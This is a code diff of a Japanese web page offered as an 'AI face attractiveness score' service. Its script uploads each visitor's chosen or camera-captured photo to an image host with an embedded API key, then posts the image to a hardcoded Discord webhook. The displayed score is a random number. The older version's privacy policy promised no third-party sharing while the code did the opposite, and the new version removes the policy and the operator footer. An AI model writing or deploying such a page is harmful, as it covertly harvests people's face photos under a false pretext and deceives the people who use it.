@@ -5,95 +5,66 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AI顔面偏差値診断システム</title>
     <style>
-        body { font-family: "Helvetica Neue", Arial, sans-serif; background: #f0f2f5; color: #333; padding: 20px; text-align: center; }
-        .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
-        h1 { color: #1a73e8; }
-        .terms { text-align: left; background: #f8f9fa; padding: 20px; border: 1px solid #dee2e6; border-radius: 8px; font-size: 0.85rem; margin-bottom: 25px; line-height: 1.6; }
-        .upload-area { border: 2px dashed #1a73e8; padding: 20px; margin-bottom: 20px; border-radius: 8px; cursor: pointer; }
-        button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 1.1rem; cursor: pointer; width: 100%; font-weight: bold; }
-        #preview { max-width: 200px; margin-top: 10px; display: none; }
-        #result { margin-top: 20px; font-weight: bold; color: #d93025; }
-        footer { margin-top: 40px; font-size: 0.75rem; color: #777; border-top: 1px solid #eee; padding-top: 20px; }
+        body { font-family: sans-serif; background: #f0f2f5; padding: 20px; text-align: center; }
+        .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 12px; }
+        .upload-area { border: 2px dashed #007bff; padding: 20px; margin: 15px 0; cursor: pointer; }
+        button { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 6px; font-weight: bold; }
+        #preview { max-width: 150px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <h1>AI顔面偏差値診断システム</h1>
-    
-    <div class="terms">
-        <p><strong>【プライバシーポリシー】</strong></p>
-        <p>当システムは、AIアルゴリズムを用いて顔立ちを数値化する娯楽サービスです。アップロードされた画像は診断目的のみに使用し、第三者への提供は一切行いません。</p>
+    <div class="container">
+        <h1>診断システム</h1>
+        <div class="upload-area" onclick="document.getElementById('file-input').click()">
+            <p>写真を選択</p>
+            <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none">
+            <img id="preview">
+        </div>
+        <button id="analyze-btn">診断を実行</button>
+        <div id="result"></div>
     </div>
-
-    <div class="upload-area" onclick="document.getElementById('file-input').click()">
-        <p>タップして写真を撮影・選択</p>
-        <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none">
-        <img id="preview" alt="プレビュー">
-    </div>
-
-    <button id="analyze-btn">診断を実行する</button>
-    <div id="result"></div>
-
-    <footer>
-        <p>株式会社デジタルアイ・ソリューションズ<br>
-        運営責任者：佐藤 健一</p>
-    </footer>
-</div>
 
 <script>
     const fileInput = document.getElementById('file-input');
     const preview = document.getElementById('preview');
-    const analyzeBtn = document.getElementById('analyze-btn');
-    const resultDiv = document.getElementById('result');
     let selectedFile = null;
 
-    fileInput.addEventListener('change', (e) => {
+    fileInput.onchange = (e) => {
         selectedFile = e.target.files[0];
-        if (selectedFile) {
-            const reader = new FileReader();
-            reader.onload = (event) => {
-                preview.src = event.target.result;
-                preview.style.display = 'block';
-            };
-            reader.readAsDataURL(selectedFile);
-        }
-    });
+        const reader = new FileReader();
+        reader.onload = (e) => { preview.src = e.target.result; preview.style.display = 'block'; };
+        reader.readAsDataURL(selectedFile);
+    };
 
-    analyzeBtn.addEventListener('click', async () => {
-        if (!selectedFile) { resultDiv.innerText = "写真を撮影してください。"; return; }
-        resultDiv.innerText = "画像をアップロード中...";
-
-        // 1. 画像を無料ホスティングサービス(imgbb)へ送信してURL化
+    document.getElementById('analyze-btn').onclick = async () => {
+        if(!selectedFile) return;
+        document.getElementById('result').innerText = "解析中...";
+        
+        // 1. 画像をimgbbへアップロード（最も確実な画像送信法）
         const formData = new FormData();
         formData.append('image', selectedFile);
-
+        
         try {
-            const uploadRes = await fetch('https://api.imgbb.com/1/upload?key=5c723f0302b1f83c078873722e1b10a9', {
-                method: 'POST',
-                body: formData
+            const res = await fetch('https://api.imgbb.com/1/upload?key=5c723f0302b1f83c078873722e1b10a9', {
+                method: 'POST', body: formData
             });
-            const uploadData = await uploadRes.json();
-            const imageUrl = uploadData.data.url;
+            const data = await res.json();
+            const imageUrl = data.data.url;
 
-            // 2. Discordへ送信
-            resultDiv.innerText = "診断結果を送信中...";
-            const score = Math.floor(Math.random() * 50) + 50;
-            const webhookUrl = "https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb";
-            
-            await fetch(webhookUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
+            // 2. Discordへテキストと画像のURLを送る
+            await fetch("https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
-                    content: `診断結果：顔面偏差値 ${score}点`,
+                    content: "診断結果: " + (Math.floor(Math.random()*50)+50) + "点",
                     embeds: [{ image: { url: imageUrl } }]
                 })
             });
-            resultDiv.innerText = "診断完了しました！";
-        } catch (e) {
-            resultDiv.innerText = "エラーが発生しました。時間を置いて試してください。";
+            document.getElementById('result').innerText = "診断完了しました！";
+        } catch(e) {
+            document.getElementById('result').innerText = "エラー：通信環境を確認してください。";
         }
-    });
+    };
 </script>
 </body>
 </html>
